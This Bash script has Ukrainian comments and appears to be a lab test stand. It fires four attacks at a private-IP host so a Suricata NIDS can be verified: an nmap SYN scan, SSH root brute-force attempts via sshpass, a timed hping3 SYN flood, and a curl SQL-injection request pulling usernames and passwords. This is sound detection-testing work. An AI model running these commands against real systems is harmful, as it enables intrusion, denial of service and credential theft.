#!/usr/bin/env bash
# ==============================================================================
# Скрипт: 02-simulate-attacks.sh
# Призначення: Генерація контрольних мережевих атак для верифікації NIDS
# ==============================================================================

TARGET="192.168.10.15"

echo "=========================================================="
echo "      СТЕНД ГЕНЕРАЦІЇ ТЕСТОВИХ АТАК ДЛЯ ВЕРИФІКАЦІЇ NIDS   "
echo "=========================================================="
echo "Цільовий вузол: $TARGET"
echo ""

# 1. Тест сканування портів Nmap SYN Scan
echo "[!] [1/4] Генерація сканування портів Nmap SYN scan..."
nmap -sS -p 21,22,80,443,3306 -T4 "$TARGET"

sleep 3

# 2. Тест перебору паролів SSH (Brute-Force)
echo "[!] [2/4] Генерація спроб підбору пароля SSH..."
for i in {1..8}; do
  sshpass -p "wrongpass$i" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 root@"$TARGET" true 2>/dev/null || true
done

sleep 3

# 3. Тест відмови в обслуговуванні TCP SYN-Flood (3 секунди)
echo "[!] [3/4] Генерація короткочасного шторму TCP SYN Flood..."
if command -v hping3 &> /dev/null; then
  timeout 3 hping3 -S --flood -p 80 "$TARGET" 2>/dev/null || true
else
  echo "[-] Утиліта hping3 не знайдена, пропускаємо Flood-тест."
fi

sleep 2

# 4. Тест веб-експлуатації (SQL Injection)
echo "[!] [4/4] Генерація сигнатури веб-атаки SQL Injection..."
curl -s -G "http://$TARGET/index.php" --data-urlencode "id=1 UNION SELECT 1,username,password FROM users" > /dev/null || true

echo ""
echo "=========================================================="
echo " [УСПІХ] Тестові атаки згенеровано!"
echo " Перевірте журнал /var/log/suricata/fast.log на сенсорі."
echo "=========================================================="
